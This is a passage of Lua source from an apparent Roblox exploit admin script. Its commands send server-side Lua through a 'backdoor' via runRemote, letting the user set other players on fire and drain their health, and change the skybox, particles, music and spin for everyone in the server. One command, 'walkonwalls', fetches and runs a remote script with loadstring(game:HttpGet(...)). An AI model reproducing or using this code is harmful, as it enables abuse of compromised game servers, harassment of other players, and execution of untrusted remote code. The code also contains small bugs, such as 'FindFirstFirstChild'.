                local processed = 0
                for i, part in ipairs(parts) do
                    createBillboardGui(part)
                    processed = processed + 1
                    
                    if processed %% batchSize == 0 then
                        wait(delayTime)
                    end
                end
            end

            local function setupLiveTracking()
                workspace.DescendantAdded:Connect(function(newDescendant)
                    if newDescendant:IsA("BasePart") then
                        createBillboardGui(newDescendant)
                    end
                end)
            end

            processBillboardsInBatches()
            setupLiveTracking()
        ]], imageId, batchSize, delayTime)

		runRemote(backdoor, targetScript)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("replaceskybox", "sky", function(imageId)
	imageId = imageId or ""

	function replaceSkybox()
		local lighting = game:GetService("Lighting")

		local oldSky = lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
			wait()
		end

		local sky = Instance.new("Sky")
		sky.SkyboxBk = "rbxassetid://" .. imageId
		sky.SkyboxDn = "rbxassetid://" .. imageId
		sky.SkyboxFt = "rbxassetid://" .. imageId
		sky.SkyboxLf = "rbxassetid://" .. imageId
		sky.SkyboxRt = "rbxassetid://" .. imageId
		sky.SkyboxUp = "rbxassetid://" .. imageId
		sky.Parent = lighting
	end

	if not backdoor then
		spawn(replaceSkybox)
	else
		local targetScript = string.format([[
            local imageId = "%s"
            
            local lighting = game:GetService("Lighting")
            local oldSky = lighting:FindFirstChildOfClass("Sky")
            if oldSky then
                oldSky:Destroy()
                task.wait()
            end
            
            local sky = Instance.new("Sky")
            sky.SkyboxBk = "rbxassetid://" .. imageId
            sky.SkyboxDn = "rbxassetid://" .. imageId
            sky.SkyboxFt = "rbxassetid://" .. imageId
            sky.SkyboxLf = "rbxassetid://" .. imageId
            sky.SkyboxRt = "rbxassetid://" .. imageId
            sky.SkyboxUp = "rbxassetid://" .. imageId
            sky.Parent = lighting
        ]], imageId)

		runRemote(backdoor, targetScript)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("fire", "fire", function(target)
	local fyecol = Color3.fromHex("4051ED")
	local secfyecol = Color3.fromHex("99a3ff")
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not backdoor then
		local function applyFire(player)
			if player and player.Character then
				local character = player.Character
				local humanoid = character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					for _, part in pairs(character:GetChildren()) do
						if part:IsA("BasePart") then
							for _, existingFire in ipairs(part:GetChildren()) do
								if existingFire:IsA("Fire") then
									existingFire:Destroy()
								end
							end
						end
					end

					for _, part in pairs(character:GetChildren()) do
						if part:IsA("BasePart") then
							local fire = Instance.new("Fire")
							fire.Size = 10
							fire.Heat = 1
							fire.Color = fyecol
							fire.SecondaryColor = secfyecol
							fire.Parent = part
						end
					end

					task.spawn(function()
						while humanoid and humanoid.Health > 0 and character.Parent do
							humanoid.Health = humanoid.Health - 20
							task.wait(0.5)
						end
					end)
				end
			end
		end

		if not target or target == "" or target == "me" then
			applyFire(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				applyFire(randomPlayer)
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() applyFire(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() applyFire(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					applyFire(player)
					break
				end
			end
		end
		return
	end

	local localPlayerName = localPlayer.Name
	local targetScript = ""

	if not target or target == "" or target == "me" then
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if humanoid then
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            for _, existingFire in ipairs(part:GetChildren()) do
                                if existingFire:IsA("Fire") then
                                    existingFire:Destroy()
                                end
                            end
                        end
                    end
                    
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 1
                            fire.Color = fyecol
                            fire.SecondaryColor = secfyecol
                            fire.Parent = part
                        end
                    end
                    
                    task.spawn(function()
                        while humanoid and humanoid.Health > 0 and character.Parent do
                            humanoid.Health = humanoid.Health - 20
                            task.wait(0.5)
                        end
                    end)
                end
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if humanoid then
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            for _, existingFire in ipairs(part:GetChildren()) do
                                if existingFire:IsA("Fire") then
                                    existingFire:Destroy()
                                end
                            end
                        end
                    end
                    
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 1
                            fire.Color = fyecol
                            fire.SecondaryColor = secfyecol
                            fire.Parent = part
                        end
                    end
                    
                    task.spawn(function()
                        while humanoid and humanoid.Health > 0 and character.Parent do
                            humanoid.Health = humanoid.Health - 20
                            task.wait(0.5)
                        end
                    end)
                end
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		targetScript = string.format([[
            local localPlayerName = "%s"
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player and player.Character then
                        local character = player.Character
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        
                        if humanoid then
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    for _, existingFire in ipairs(part:GetChildren()) do
                                        if existingFire:IsA("Fire") then
                                            existingFire:Destroy()
                                        end
                                    end
                                end
                            end
                            
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    local fire = Instance.new("Fire")
                                    fire.Size = 10
                                    fire.Heat = 1
                                    fire.Color = fyecol
                                    fire.SecondaryColor = secfyecol
                                    fire.Parent = part
                                end
                            end
                            
                            task.spawn(function()
                                while humanoid and humanoid.Health > 0 and character.Parent do
                                    humanoid.Health = humanoid.Health - 20
                                    task.wait(0.5)
                                end
                            end)
                        end
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		targetScript = [[
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player and player.Character then
                    local character = player.Character
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    
                    if humanoid then
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                for _, existingFire in ipairs(part:GetChildren()) do
                                    if existingFire:IsA("Fire") then
                                        existingFire:Destroy()
                                    end
                                end
                            end
                        end
                        
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                local fire = Instance.new("Fire")
                                fire.Size = 10
                                fire.Heat = 1
                                fire.Color = fyecol
                                fire.SecondaryColor = secfyecol
                                fire.Parent = part
                            end
                        end
                        
                        task.spawn(function()
                            while humanoid and humanoid.Health > 0 and character.Parent do
                                humanoid.Health = humanoid.Health - 20
                                task.wait(0.5)
                            end
                        end)
                    end
                end
            end
        ]]
	else
		targetScript = string.format([[
            local targetName = "%s"
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player and player.Character then
                        local character = player.Character
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        
                        if humanoid then
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    for _, existingFire in ipairs(part:GetChildren()) do
                                        if existingFire:IsA("Fire") then
                                            existingFire:Destroy()
                                        end
                                    end
                                end
                            end
                            
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    local fire = Instance.new("Fire")
                                    fire.Size = 10
                                    fire.Heat = 1
                                    fire.Color = fyecol
                                    fire.SecondaryColor = secfyecol
                                    fire.Parent = part
                                end
                            end
                            
                            task.spawn(function()
                                while humanoid and humanoid.Health > 0 and character.Parent do
                                    humanoid.Health = humanoid.Health - 20
                                    task.wait(0.5)
                                end
                            end)
                        end
                    end
                end
            end
        ]], target)
	end

	if targetScript ~= "" then
		runRemote(backdoor, targetScript)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("dynamic9007", "dyn9007", function()
	local emotionController = {}

	local emotions = {
		angry = "rbxassetid://114905525024059",
		neutral = "rbxassetid://16116369076",
		blink = "rbxassetid://140719110059829"
	}

	local speaktxt = {
		angry = "rbxassetid://120009922945165",
		neutral = "rbxassetid://124616696573508",
		blink = "rbxassetid://110245971364225"
	}

	local currentEmotion = "angry"
	local isResting = false
	local isBlinking = true
	local isSpeaking = false
	local running = true
	local backdoorMode = false
	local pointLight = nil
	local localAccessory = nil
	local blinkThread = nil
	local speakThread = nil

	local function fullCleanup()
		running = false

		if blinkThread then
			coroutine.close(blinkThread)
			blinkThread = nil
		end

		if speakThread then
			coroutine.close(speakThread)
			speakThread = nil
		end

		if pointLight then
			pointLight:Destroy()
			pointLight = nil
		end
	end

	local function runEmotionSystem()
		fullCleanup()
		running = true
		backdoorMode = false

		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		local function setupAccessory(char)
			for _, accessory in ipairs(char:GetChildren()) do
				if accessory:IsA("Accessory") and 
					(accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						if not handle:FindFirstChild("EmotionLight") then
							pointLight = Instance.new("PointLight")
							pointLight.Name = "EmotionLight"
							pointLight.Brightness = 3
							pointLight.Range = 20
							pointLight.Color = Color3.fromHex("#3244ed")
							pointLight.Parent = handle
						end
						localAccessory = accessory
						return accessory
					end
				end
			end
			return nil
		end

		function emotionController.updateTexture(textureId)
			local accessory = setupAccessory(character)
			if not accessory then return end

			local handle = accessory:FindFirstChild("Handle")
			if not handle then return end

			local mesh = handle:FindFirstChildOfClass("SpecialMesh")
			if mesh then
				mesh.TextureId = textureId
			end

			if pointLight then
				pointLight.Color = Color3.fromHex("#3244ed")
			end
		end

		player.CharacterAdded:Connect(function(newChar)
			if not running then return end
			character = newChar
			pointLight = nil
			localAccessory = nil
			emotionController.updateTexture(emotions[currentEmotion])
		end)

		blinkThread = task.spawn(function()
			while running do
				if not isResting and isBlinking and not isSpeaking then
					local waitTime = math.random(3, 5)
					local startTime = os.clock()

					while os.clock() - startTime < waitTime and running do
						task.wait(0.1)
					end

					if running then
						emotionController.updateTexture(emotions["blink"])
						task.wait(0.1)
						emotionController.updateTexture(emotions[currentEmotion])
					end
				else
					task.wait(0.1)
				end
			end
		end)

		speakThread = task.spawn(function()
			while running do
				if isSpeaking then
					local emotion = isResting and "blink" or currentEmotion
					if speaktxt[emotion] then
						emotionController.updateTexture(speaktxt[emotion])
						task.wait(0.1)
						emotionController.updateTexture(emotions[emotion])
						task.wait(0.1)
					end
				else
					task.wait(0.1)
				end
			end
		end)

		emotionController.updateTexture(emotions[currentEmotion])
	end

	local function runBackdoorVersion()
		fullCleanup()
		backdoorMode = true
		currentEmotion = "angry"

		local scriptToRun = [[
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local emotions = {
        	angry = "rbxassetid://114905525024059",
        	neutral = "rbxassetid://16116369076",
        	blink = "rbxassetid://140719110059829"
        }

        local speaktxt = {
        	angry = "rbxassetid://120009922945165",
        	neutral = "rbxassetid://124616696573508",
        	blink = "rbxassetid://110245971364225"
        }
        
        local currentEmotion = "angry"
        local isResting = false
        local isBlinking = true
        local isSpeaking = false
        local running = true
        
        local activeLights = {}
        local characterConnections = {}
        
        local function applyToCharacter(character)
            for _, accessory in ipairs(character:GetChildren()) do
                if accessory:IsA("Accessory") and 
                   (accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
                    local handle = accessory:FindFirstChild("Handle")
                    if handle then
                        local mesh = handle:FindFirstChildOfClass("SpecialMesh")
                        if mesh then
                            mesh.TextureId = emotions[currentEmotion]
                        end
                        
                        if not activeLights[handle] then
                            local light = Instance.new("PointLight")
                            light.Name = "EmotionLight"
                            light.Brightness = 3
                            light.Range = 20
                            light.Color = Color3.fromHex("#3244ed")
                            light.Parent = handle
                            activeLights[handle] = light
                            
                            handle.AncestryChanged:Connect(function(_, parent)
                                if not parent then
                                    if activeLights[handle] then
                                        activeLights[handle]:Destroy()
                                        activeLights[handle] = nil
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end
        
        for _, player in pairs(Players:GetPlayers()) do
            characterConnections[player] = player.CharacterAdded:Connect(function(character)
                if running then
                    applyToCharacter(character)
                end
            end)
            
            if player.Character then
                applyToCharacter(player.Character)
            end
        end
        
        local function updateAll(textureId)
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character then
                    for _, accessory in ipairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") and 
                           (accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                local mesh = handle:FindFirstChildOfClass("SpecialMesh")
                                if mesh then
                                    mesh.TextureId = textureId
                                end
                                
                                if activeLights[handle] then
                                    activeLights[handle].Color = Color3.fromHex("#3244ed")
                                end
                            end
                        end
                    end
                end
            end
        end
        
        local blinkCoroutine = coroutine.create(function()
            while running do
                if not isResting and isBlinking and not isSpeaking then
                    local waitTime = math.random(3, 5)
                    local startTime = os.clock()
                    
                    while os.clock() - startTime < waitTime and running do
                        RunService.Heartbeat:Wait()
                    end
                    
                    if running then
                        updateAll(emotions["blink"])
                        task.wait(0.1)
                        updateAll(emotions[currentEmotion])
                    end
                else
                    task.wait(0.1)
                end
            end
        end)
        
        local speakCoroutine = coroutine.create(function()
            while running do
                if isSpeaking then
                    local emotion = isResting and "blink" or currentEmotion
                    if speaktxt[emotion] then
                        updateAll(speaktxt[emotion])
                        task.wait(0.1)
                        updateAll(emotions[emotion])
                        task.wait(0.1)
                    end
                else
                    task.wait(0.1)
                end
            end
        end)
        
        coroutine.resume(blinkCoroutine)
        coroutine.resume(speakCoroutine)
        
        return function()
            running = false
            if blinkCoroutine then
                coroutine.close(blinkCoroutine)
            end
            if speakCoroutine then
                coroutine.close(speakCoroutine)
            end
            for player, connection in pairs(characterConnections) do
                connection:Disconnect()
            end
            for handle, light in pairs(activeLights) do
                if light then
                    light:Destroy()
                end
            end
            activeLights = {}
            characterConnections = {}
        end
    ]]

		local cleanupFunc = runRemote(backdoor, scriptToRun)

		emotionController.cleanupBackdoor = cleanupFunc
	end

	if backdoor then
		runBackdoorVersion()
	else
		runEmotionSystem()
	end

	if not backdoorMode then
		local backdoorConnection
		backdoorConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if backdoor and not backdoorMode then
				backdoorConnection:Disconnect()
				runBackdoorVersion()
			end
		end)
	end

	return emotionController
end)

--------------------------------------------------------------------------------------------------------------

antifling = nil

addcommand("antifling", "afling", function()
	if antifling then
		antifling:Disconnect()
		antifling = nil
	end
	antifling = RunService.Stepped:Connect(function()
		for _, player in pairs(Players:GetPlayers()) do
			if player ~= speaker and player.Character then
				for _, v in pairs(player.Character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end
			end
		end
	end)
end)

addcommand("unantifling", "uafling", function()
	if antifling then
		antifling:Disconnect()
		antifling = nil
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("walkonwalls", "wallwalk", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
end)

--------------------------------------------------------------------------------------------------------------

addcommand("particle", "particle", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function getTorso(character)
		return character:FindFirstChild("Torso") or 
			character:FindFirstChild("UpperTorso") or
			character:FindFirstChild("HumanoidRootPart")
	end

	local function addParticle(player)
		if player and player.Character then
			local torso = getTorso(player.Character)
			if torso then
				for _, child in ipairs(torso:GetChildren()) do
					if child:IsA("ParticleEmitter") then
						child:Destroy()
					end
				end

				local pe = Instance.new("ParticleEmitter")
				pe.Texture = "rbxassetid://" .. imageId
				pe.VelocitySpread = 0
				pe.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)

				local se = Instance.new("ParticleEmitter")
				se.Texture = "rbxassetid://" .. imageId
				se.VelocitySpread = 0
				se.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)

				local fe = Instance.new("ParticleEmitter")
				fe.Texture = "rbxassetid://" .. imageId
				fe.VelocitySpread = 0
				fe.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			addParticle(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				addParticle(players[math.random(1, #players)])
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() addParticle(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() addParticle(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					addParticle(player)
					break
				end
			end
		end
	else
		local targetScript

		if not target or target == "" or target == "me" then
			targetScript = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    local torso = player.Character:FindFirstChild("Torso") or 
                                 player.Character:FindFirstChild("UpperTorso") or
                                 player.Character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        for _, child in ipairs(torso:GetChildren()) do
                            if child:IsA("ParticleEmitter") then
                                child:Destroy()
                            end
                        end

                        local pe = Instance.new("ParticleEmitter")
                        pe.Texture = "rbxassetid://%d"
                        pe.VelocitySpread = 50
                        pe.Parent = torso

                        local se = Instance.new("ParticleEmitter")
                        se.Texture = "rbxassetid://%d"
                        se.VelocitySpread = 50
                        se.Parent = torso

                        local fe = Instance.new("ParticleEmitter")
                        fe.Texture = "rbxassetid://%d"
                        fe.VelocitySpread = 50
                        fe.Parent = torso
                    end
                end
            ]], localPlayer.Name, imageId, imageId, imageId)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				targetScript = string.format([[
                    local player = game:GetService("Players"):FindFirstChild("%s")
                    if player and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                ]], randomPlayer.Name, imageId, imageId, imageId)
			end
		elseif target == "others" then
			targetScript = string.format([[
                local localPlayer = game:GetService("Players"):FindFirstChild("%s")
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= localPlayer and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                end
            ]], localPlayer.Name, imageId, imageId, imageId)
		elseif target == "all" then
			targetScript = string.format([[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                end
            ]], imageId, imageId, imageId)
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        local player = game:GetService("Players"):FindFirstChild("%s")
                        if player and player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or 
                                         player.Character:FindFirstChild("UpperTorso") or
                                         player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _, child in ipairs(torso:GetChildren()) do
                                    if child:IsA("ParticleEmitter") then
                                        child:Destroy()
                                    end
                                end

                                local pe = Instance.new("ParticleEmitter")
                                pe.Texture = "rbxassetid://%d"
                                pe.VelocitySpread = 50
                                pe.Parent = torso

                                local se = Instance.new("ParticleEmitter")
                                se.Texture = "rbxassetid://%d"
                                se.VelocitySpread = 50
                                se.Parent = torso

                                local fe = Instance.new("ParticleEmitter")
                                fe.Texture = "rbxassetid://%d"
                                fe.VelocitySpread = 50
                                fe.Parent = torso
                            end
                        end
                    ]], player.Name, imageId, imageId, imageId)
					break
				end
			end
		end

		if targetScript then
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unparticle", "unparticle", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function getTorso(character)
		return character:FindFirstChild("Torso") or 
			character:FindFirstChild("UpperTorso") or
			character:FindFirstFirstChild("HumanoidRootPart")
	end

	local function removeParticles(player)
		if player and player.Character then
			local torso = getTorso(player.Character)
			if torso then
				for _, child in ipairs(torso:GetChildren()) do
					if child:IsA("ParticleEmitter") then
						child:Destroy()
					end
				end
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			removeParticles(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				removeParticles(players[math.random(1, #players)])
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() removeParticles(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() removeParticles(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removeParticles(player)
					break
				end
			end
		end
	else
		local targetScript

		if not target or target == "" or target == "me" then
			targetScript = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    local torso = player.Character:FindFirstChild("Torso") or 
                                 player.Character:FindFirstChild("UpperTorso") or
                                 player.Character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        for _, child in ipairs(torso:GetChildren()) do
                            if child:IsA("ParticleEmitter") then
                                child:Destroy()
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				targetScript = string.format([[
                    local player = game:GetService("Players"):FindFirstChild("%s")
                    if player and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name)
			end
		elseif target == "others" then
			targetScript = string.format([[
                local localPlayer = game:GetService("Players"):FindFirstChild("%s")
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= localPlayer and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        local player = game:GetService("Players"):FindFirstChild("%s")
                        if player and player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or 
                                         player.Character:FindFirstChild("UpperTorso") or
                                         player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _, child in ipairs(torso:GetChildren()) do
                                    if child:IsA("ParticleEmitter") then
                                        child:Destroy()
                                    end
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if targetScript then
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

currentMusic = nil

addcommand("music", "music", function(soundId)
	local targetScript
	targetScript = [[
        if not game:GetService("Workspace"):FindFirstChild("CurrentMusic") then
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://" .. "%soundId%"
            sound.Looped = true
            sound.Volume = 1
            sound.Parent = game.Workspace
            sound.Name = "CurrentMusic"
            sound:Play()
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://" .. soundId
			sound.Looped = true
			sound.Volume = 1
			sound.Parent = game.Workspace
			sound.Name = "CurrentMusic"
			sound:Play()
			currentMusic = sound
		end
	else
		targetScript = targetScript:gsub("%%soundId%%", soundId)

		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("volume", "volume", function(volume)
	local targetScript
	targetScript = [[
        local sound = game.Workspace:FindFirstChild("CurrentMusic")
        if sound then
            sound.Volume = %volume%
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			if currentMusic then
				currentMusic.Volume = volume
			end
		end
	else
		targetScript = targetScript:gsub("%%volume%%", volume)

		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("pitch", "pitch", function(pitch)
	local targetScript
	targetScript = [[
        local sound = game.Workspace:FindFirstChild("CurrentMusic")
        if sound then
            sound.Pitch = %pitch%
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			if currentMusic then
				currentMusic.Pitch = pitch
			end
		end
	else
		targetScript = targetScript:gsub("%%pitch%%", pitch)

		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unmusic", "unmusic", function()
	local targetScript
	targetScript = [[
        local sound = game.Workspace:FindFirstChild("CurrentMusic")
        if sound then
            sound:Destroy()
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			spawn(function()
				local sound = game.Workspace:FindFirstChild("CurrentMusic")
				if sound then
					sound:Destroy()
				end
			end)
			if currentMusic then
				currentMusic:Destroy()
				currentMusic = nil
			end
		end
	else
		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spin", "spin", function(target, number)
	number = tonumber(number) or 5
	local players = game:GetService("Players"):GetPlayers()

	function startSpinning(player, speed)
		local character = player.Character
		if character then
			for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end

			local spin = Instance.new("BodyAngularVelocity")
			spin.Name = "Spinning"
			spin.Parent = character:WaitForChild("HumanoidRootPart")
			spin.MaxTorque = Vector3.new(0, math.huge, 0)
			spin.AngularVelocity = Vector3.new(0, speed, 0)
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			startSpinning(localPlayer, number)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			startSpinning(randomPlayer, number)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					startSpinning(player, number)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				startSpinning(player, number)
			end
		else
			local found = false
